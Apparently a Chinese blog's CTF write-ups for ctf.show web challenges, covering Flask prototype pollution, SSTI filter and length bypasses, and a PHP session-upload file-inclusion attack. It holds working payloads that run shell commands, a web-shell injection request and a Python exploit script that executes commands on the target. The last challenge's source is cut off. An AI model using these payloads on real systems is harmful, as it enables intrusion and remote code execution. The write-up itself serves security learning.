+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://tyboykali.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-xue-xue" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/05/11/xue-xue/" class="article-date">
+  <time class="dt-published" datetime="2026-05-10T16:00:00.000Z" itemprop="datePublished">2026-05-11</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      学学
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h3 id="ez-inject"><a href="#ez-inject" class="headerlink" title="ez_inject"></a>ez_inject</h3><p><img src="/images/image-20260506195451803.png" alt="image-20260506195451803"></p>
+<p>随便注册一个账号</p>
+<p>登录进去发现提示</p>
+<p><img src="/images/image-20260506195617441.png" alt="image-20260506195617441"></p>
+<p>提示污染密钥</p>
+<p>大佬的非预期解</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;__init__&quot;:&#123;&quot;__globals__&quot;:&#123;&quot;app&quot; : &#123;&quot;static_folder&quot; :&quot;./../../../../../../&quot; &#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将&#x2F;static污染为根目录</p>
+<p>搭配上用户名密码是这样的</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;a&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;a&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;app&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;static_folder&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./../../../../../../&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20260506203220019.png" alt="image-20260506203220019"></p>
+<p>然后访问&#x2F;static&#x2F;flag得到答案</p>
+<p>记得Content-Type 改成 application&#x2F;json否则服务器没法辨别</p>
+<p>正常修改SECRET_KEY的值</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;a&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;a&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;app&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;config&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;SECRET_KEY&quot;</span><span class="punctuation">:</span> <span class="string">&quot;123&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后使用工具伪造session</p>
+<p><img src="/images/image-20260506205534655.png" alt="image-20260506205534655"></p>
+<p>伪造好后改cooike</p>
+<p>如果改好cooike发现登录退掉了，实际上是没有成功改造cooike</p>
+<p><img src="/images/image-20260506211100617.png" alt="image-20260506211100617"></p>
+<p>打开secret得到了提示</p>
+<p><img src="/images/image-20260506211200550.png" alt="image-20260506211200550"></p>
+<p>建议使用工具把cooike存起来，这样不用每次都改</p>
+<p>这里是ssti</p>
+<p>经过测试可以得知过滤了. 关键字init globals builtins os等等</p>
+<p>当前对象从self出发的没有过滤</p>
+<p>如果使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self[&#x27;__in&#x27;&#x27;it__&#x27;]</span><br></pre></td></tr></table></figure>
+
+<p>可以看到回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self[&#x27;__in&#x27;&#x27;it__&#x27;][&#x27;__glo&#x27;&#x27;bals__&#x27;][&#x27;__buil&#x27;&#x27;tins__&#x27;][&#x27;ope&#x27;&#x27;n&#x27;](&#x27;/flag&#x27;).read()</span><br></pre></td></tr></table></figure>
+
+<p>可得答案</p>
+<h3 id="ezzz-ssti"><a href="#ezzz-ssti" class="headerlink" title="ezzz_ssti"></a>ezzz_ssti</h3><p><img src="/images/image-20260508210412057.png" alt="image-20260508210412057"></p>
+<p>get参数user就是ssti入口</p>
+<p>使用fenjing进行检测</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m fenjing crack --url https://e26c8e67-e740-479d-864d-b9aa679d7f08.challenge.ctf.show/ --method GET -i user --no-verify-ssl     //不要ssl报错</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20260508210526507.png" alt="image-20260508210526507"></p>
+<p>发现防火墙只有一条规则不能长</p>
+<p>这里使用一个绕过技术</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43995419/article/details/126811287">Python Flask SSTI 之 长度限制绕过_python绕过长度限制的内置函数-CSDN博客</a></p>
+<p>利用config全局对象多次playload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;cycler.__init__.__globals__.os.popen(&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;config.update(u=cycler.__init__)&#125;&#125;</span><br><span class="line">&#123;&#123;config.update(u=config.u.__globals__)&#125;&#125;</span><br><span class="line">&#123;&#123;config.update(u=config.u.os.popen)&#125;&#125;</span><br><span class="line">&#123;&#123;config.u(&#x27;/flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>一开始想着这样</p>
+<p>结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.update(u=config.u.__globals__)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>太长了不行</p>
+<p>要找到一个globals连着链头的，这样才能避免config.u超标</p>
+<p>wp看到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__.os.popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.update(u=url_for.__globals__)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>更短过了</p>
+<p>继续交得到答案</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__.os.popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;config.update(u=url_for.__globals__)&#125;&#125;</span><br><span class="line">&#123;&#123;config.update(u=config.u.os.popen)&#125;&#125;</span><br><span class="line">&#123;&#123;config.u(&quot;cat /f*&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="session写入文件包含"><a href="#session写入文件包含" class="headerlink" title="session写入文件包含"></a>session写入文件包含</h3><p>访问页面</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$path</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[a-z]+/&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;file://&quot;</span>.<span class="variable">$_POST</span>[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>^ 匹配字符串起始位置，[a-z] 匹配任意小写字母，表示至少一个</p>
+<p>开头必须是小写字母</p>
+<p>替换.号为空</p>
+<p>include会包含file:&#x2F;&#x2F;文件内容</p>
+<p>虽然..&#x2F;被ban了，还是可以使用localhost进行路径穿越</p>
+<p>需要上传一个木马文件</p>
+<p>wp里面说可以通过session写入文件</p>
+<p>大概的请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: target.com</span><br><span class="line">Cookie: PHPSESSID=myshell     //文件名</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary</span><br><span class="line">Content-Length: 234</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">&lt;?php system($_POST[&#x27;cmd&#x27;]); ?&gt;         //session写入</span><br><span class="line">------WebKitFormBoundary</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.txt&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">dummy                    //普通文件      </span><br><span class="line">------WebKitFormBoundary--</span><br></pre></td></tr></table></figure>
+
+<p>文件会被传到 localhost&#x2F;tmp&#x2F;sess_myshell 的地方</p>
+<p>然后需要</p>
+<p>post传参1包含文件localhost&#x2F;tmp&#x2F;sess_myshell</p>
+<p>post传参cmd就是命令</p>
+<p>理论上这样需要竞争，因为接收第二个请求的时候第一个请求的tmp文件就会被删除</p>
+<p>修改了之后可以做到一个请求包含shell上传和命令执行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ========== 配置区 ==========</span></span><br><span class="line">url = <span class="string">&quot;https://04287a42-1e06-48e7-b57b-36a8e1158f61.challenge.ctf.show/&quot;</span></span><br><span class="line">session_id = <span class="string">&quot;ctfsho&quot;</span></span><br><span class="line">commands = [</span><br><span class="line">    <span class="string">&quot;cat /flag_is_here.txt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cat /flag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cat /flag.txt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ls /&quot;</span>,</span><br><span class="line">]</span><br><span class="line"><span class="comment"># ============================</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">cmd</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[cmd]);?&gt;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;1&#x27;</span>: <span class="string">f&#x27;localhost/tmp/sess_<span class="subst">&#123;session_id&#125;</span>&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;cmd&#x27;</span>: <span class="string">f&#x27;system(&quot;<span class="subst">&#123;cmd&#125;</span>&quot;);&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    file = &#123;<span class="string">&#x27;file&#x27;</span>: session_id&#125;         <span class="comment">#上传原始文件名</span></span><br><span class="line">    cookies = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: session_id&#125;           <span class="comment">#文件名</span></span><br><span class="line">    r = requests.post(url=url, data=data, files=file, cookies=cookies, verify=<span class="literal">False</span>, timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_flag</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">for</span> pattern <span class="keyword">in</span> [<span class="string">r&#x27;ctfshow\&#123;[^&#125;]+\&#125;&#x27;</span>, <span class="string">r&#x27;flag\&#123;[^&#125;]+\&#125;&#x27;</span>, <span class="string">r&#x27;CTF\&#123;[^&#125;+\&#125;&#x27;</span>, <span class="string">r&#x27;FLAG\&#123;[^&#125;+\&#125;&#x27;</span>]:</span><br><span class="line">        <span class="keyword">match</span> = re.search(pattern, text, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">match</span>.group(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] Target: <span class="subst">&#123;url&#125;</span>\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> cmd <span class="keyword">in</span> commands:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] <span class="subst">&#123;cmd&#125;</span>&quot;</span>)</span><br><span class="line">    result = exploit(cmd)</span><br><span class="line">    flag = find_flag(result)</span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n[+] FLAG: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>执行可得到答案</p>
+<h3 id="ez-web"><a href="#ez-web" class="headerlink" title="ez_web"></a>ez_web</h3><p>因为比较菜所以我觉得并不简单,参考了大佬的wp</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">开胃小菜，就让我成为签到题叭 <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf1</span>(<span class="params"><span class="variable">$Chu0</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$Chu0</span> <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]/i&#x27;</span>, <span class="variable">$value</span>))&#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;waf1&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf2</span>(<span class="params"><span class="variable">$Chu0</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/show/i&#x27;</span>, <span class="variable">$Chu0</span>))</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;waf2&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf_in_waf_php</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$count</span> = <span class="title function_ invoke__">substr_count</span>(<span class="variable">$a</span>,<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hinthinthint,base64喔&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$count</span>!=<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> True;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ucs-2|phar|data|input|zip|flag|\%/i&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> True;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$h1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$h2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;fastfast&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;h1-&gt;<span class="title function_ invoke__">nonono</span>(<span class="variable">$this</span>-&gt;h2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctf/i&#x27;</span>,<span class="variable">$args</span>[<span class="number">0</span>][<span class="number">0</span>][<span class="number">2</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;gogogo&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chu0_write</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chu0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chu1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;chu0 = <span class="string">&#x27;xiuxiuxiu&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__toString&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;chu0===<span class="variable language_">$this</span>-&gt;chu1)&#123;</span><br><span class="line">            <span class="variable">$content</span>=<span class="string">&#x27;ctfshowshowshowwww&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;chu0&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">waf_in_waf_php</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">                <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot;.txt&quot;</span>,<span class="variable">$content</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;绕一下吧孩子&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">                <span class="variable">$tmp</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;ctfw.txt&#x27;</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$tmp</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/f|l|a|g|x|\*|\?|\[|\]| |\&#x27;|\&lt;|\&gt;|\%/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">                    <span class="keyword">eval</span>(<span class="variable">$tmp</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]));</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;waf!&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;ctfw.txt&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Go on&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$_GET</span>[<span class="string">&#x27;show_show.show&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;开胃小菜，就让我成为签到题叭&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;WAF,启动！&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">waf1</span>(<span class="variable">$_REQUEST</span>);</span><br><span class="line">    <span class="title function_ invoke__">waf2</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[Oa]:[\d]/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;show_show.show&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;show_show.show&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;被waf啦&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>waf1</p>
